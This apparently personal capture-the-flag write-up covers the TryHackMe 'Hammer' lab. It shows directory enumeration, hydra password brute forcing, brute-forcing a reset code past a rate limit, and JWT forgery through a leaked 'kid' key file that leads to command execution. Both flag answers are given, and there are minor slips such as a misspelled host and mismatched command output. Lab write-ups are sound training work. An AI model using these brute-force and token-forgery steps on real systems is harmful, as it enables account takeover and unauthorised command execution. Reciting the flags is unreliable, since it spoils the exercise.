@@ -1,0 +1,155 @@
+---------------------Harmer room Tryhackme -----------------
+
+limk : https://tryhackme.com/r/room/hammer
+Date : 22-01-2025
+DNS  : hammer.thm
+
+
+---------Enumeration
+--> rustscan -a hammer.thm -- -A -sV -sC -O -Pn
+	--> 22  ssh 
+	--> 1337 http 
+
+----Web server enumeration
+After seeing the code source of the page i found a comment for developpers :
+
+<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
+
+i think all directory name start with hmr_ so i will take a wordlist and add hmr_ at the begining of all words
+
+-->sed 's/^/hmr_/' /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt > wordlist.txt
+
+
+After doing that i launch my gobuster with my new worlist
+
+-->gobuster dir -u http://hammer.thm:1337/ -w wordlist.txt -t 100
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://hammer.thm:1337/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                wordlist.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/hmr_images           (Status: 301) [Size: 322] [--> http://hammer.thm:1337/hmr_images/]
+/hmr_css              (Status: 301) [Size: 319] [--> http://hammer.thm:1337/hmr_css/]
+/hmr_js               (Status: 301) [Size: 318] [--> http://hammer.thm:1337/hmr_js/]
+/hmr_logs             (Status: 301) [Size: 320] [--> http://hammer.thm:1337/hmr_logs/]
+
+
+the mistrerious one was hmr_logs directory so i go there. i think i will found somethink good
+
+------The content-----
+[Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
+[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
+[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
+[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
+[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
+[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
+[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
+[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
+[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down
+
+
+what i noticed:
+Email --> tester@hammer.thm  
+directories potentials:
+	-->/restricted-area
+	-->/admin-login
+	-->/var/www/html/locked-down
+	-->home/hammerthm/test.php
+	-->/var/www/html/protected
+
+As we have an email we will try to bruteforce to see if we can found the password. Then i will launch my burpsuite to understand the login mechanism and after that try the brute force.
+-->hydra -l tester@hammer.thm -P /usr/share/wordlists/rockyou.txt harmmer.thm http-post-form "/index.php:email=^USER^&password=^PASS^:Invalid Email or Password" -s 1337 -vV
+
+i think i foun another way to access to the dashboard with reset password option when i click on it the ask me to put my 4 digits code and i have much time so i will brute force this code 
+
+i try before with a script i wrote to test lot of number but it dose not work after that i try with one script named script.py which tested just one number to see where was my mistake. this script has one think bad which is that you have to put the right session id. After this i upgrade it triying to automate it but it tested jut 8 cases before beeing blocked. 
+
+After my reseaches i noticed that there was a limit because of this parameter on the response of burp
+Parameter: Rate-Limit-Pending: 6 <----- which was downgrading
+
+After a long hour of research i found someone script that i name : nathansec_script
+
+Script location: https://github.com/MatSec21/HammerTHM/blob/abc121ccb61f832ebe33becf4063189d9482dd75/bruteforcecodes.py
+
+It was like God gift
+
+python3 nathansec_script.py 
+[+] Sending the password reset request.
+[+] Starting the code brute-force.
+[+] Found the recovery code: 8927
+[+] Sending the new password request.
+[+] Password is set to Password123
+
+
+After that i access to the dashboard and pick the first flag
+
+Flag1 --> THM{AuthBypass3D}
+
+-------------------Next flag searching----------
+It was a form in which we can put one command to execute and when i put one command like id i recieve message that the command wasn't allor and the system logout automatically,
+So if i want to test command i have to login at each occasion.
+I launch my burp to see why i was logout at each command. see my burp request
+
+POST /execute_command.php HTTP/1.1
+Host: hammer.thm:1337
+Content-Length: 16
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM3NTcyNjA5LCJleHAiOjE3Mzc1NzYyMDksImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.KtHzCrFvURoc0ZhYGLSuCuqxmSu5IndE21n5PQ-4nBY
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-US,en;q=0.9
+Accept: */*
+Content-Type: application/json
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
+Origin: http://hammer.thm:1337
+Referer: http://hammer.thm:1337/dashboard.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=36bj64po361lldjd447tnuet4b; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM3NTcyNjA5LCJleHAiOjE3Mzc1NzYyMDksImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.KtHzCrFvURoc0ZhYGLSuCuqxmSu5IndE21n5PQ-4nBY; persistentSession=no
+Connection: keep-alive
+
+{"command":"id"}
+
+------------
+I just noticed that : persistentSession=no
+ so let me modify it to yes and see more clear.
+
+When i remove ths and try the command ls it works see the result
+
+{"output":"188ade1.key\ncomposer.json\nconfig.php\ndashboard.php\nexecute_command.php\nhmr_css\nhmr_images\nhmr_js\nhmr_logs\nindex.php\nlogout.php\nreset_password.php\nvendor\n"}
+
+i see we have a key file we will try to download it in the URL: http://hammer.thm:1337/188ade1.key
+
+When we download it there is the content : 56058354efb3daa97ebab00fabd7a7d7
+
+I think it is an key but i don't know about what so we will try to decode the token we have in the request on https://jwt.io website.
+
+There we will change some thinhs like :
+
+"kid": "/var/www/html/188ade1.key"
+"role": "admin"
+At the end we will put the content of our key into the secret key place. After that we obtain a new token 
+
+New_token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM3NTc0MTk3LCJleHAiOjE3Mzc1Nzc3OTcsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.-OtdwnMDxmLUXOLJfGcX0gBJ2Pq8IRv8DtXH_HcDDvU
+
+We will change the old one by this At the first place and after that when i execute command ls i found something
+
+{"output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"}
+
+
+So now try reading the flag2 with the command : cat /home/ubuntu/flag.txt
+
+{"output":"THM{RUNANYCOMMAND1337}\n"}
+
+
+Flag2 --> THM{RUNANYCOMMAND1337}
+
+
+
+Thank you for reading my opinion of the room @petstar from togo
